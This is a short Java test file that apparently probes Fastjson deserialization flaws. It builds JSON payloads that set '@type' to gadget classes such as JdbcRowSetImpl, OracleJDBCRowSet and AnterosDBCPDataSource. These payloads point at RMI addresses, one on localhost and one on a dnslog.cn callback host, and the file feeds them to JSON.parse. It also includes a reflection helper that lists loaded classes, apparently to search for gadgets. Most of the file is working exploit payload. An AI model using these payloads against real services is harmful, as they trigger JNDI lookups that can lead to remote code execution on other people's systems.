package com.exploit.fastjson;

import java.lang.reflect.Field;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import com.alibaba.fastjson.JSON;

public class Test {

    public static void main(String[] args) {
//        String str = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
//                "\"dataSourceName\":\"rmi://127.0.0.1:1099/exploit\",\"autoCommit\":true}";
//        String str = "{\"@type\":\"java.lang.Throwable\",\"@type\":\"sun.jvm.hotspot.debugger.AddressException\"," +
//                "\"addr\":2222}\n";

        String str = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"oracle.jdbc.rowset" +
                ".OracleJDBCRowSet\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"command\":\"111\"}";

//        str = "{\"@type\":\"java.lang.AutoCloseable\"";
        str = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPDataSource\",\"metricRegistry\":\"rmi://dj3onf.dnslog" +
                ".cn/hello\"}\n";
        Object object = JSON.parse(str);

        System.out.println(1);


    }


    public static List<Class<?>> getAllActionSubClass(Class cls) throws Exception {
        Field field = null;
        Vector v = null;

        List<Class<?>> allSubclass = new ArrayList<Class<?>>();
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class<?> classOfClassLoader = classLoader.getClass();

        while (classOfClassLoader != ClassLoader.class) {
            classOfClassLoader = classOfClassLoader.getSuperclass();
        }
        field = classOfClassLoader.getDeclaredField("classes");
        field.setAccessible(true);
        v = (Vector) field.get(classLoader);
        for (int i = 0; i < v.size(); ++i) {
            Class<?> c = (Class<?>) v.get(i);
            if (cls.isAssignableFrom(c) && !cls.equals(c)) {
                allSubclass.add((Class<?>) c);
            }
        }
        return allSubclass;
    }

}
